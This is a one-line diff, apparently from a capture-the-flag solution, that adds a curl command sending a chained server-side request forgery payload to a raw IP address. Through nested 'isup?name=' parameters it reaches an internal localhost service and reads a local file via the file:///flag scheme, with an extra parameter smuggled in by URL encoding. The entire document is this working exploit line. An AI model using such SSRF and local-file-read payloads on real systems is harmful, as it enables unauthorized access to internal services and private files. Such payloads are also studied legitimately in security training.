@@ -1,0 +1,2 @@
+curl 108.61.211.185/isup?name=http://127.0.0.1:8080/isup?name=file:///flag%26kuchenblech
+
